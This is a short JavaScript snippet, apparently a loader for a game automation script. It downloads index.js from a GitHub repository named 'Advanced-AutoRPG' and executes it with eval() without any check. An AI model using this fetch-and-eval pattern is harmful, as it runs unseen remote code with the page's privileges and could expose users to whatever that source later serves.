(async function() {
  let content = await fetch('https://raw.githubusercontent.com/soyuo07/Advanced-AutoRPG/refs/heads/main/index.js', {
    method: 'GET'
  });
  let result = await content.text();
  eval(result);
})();
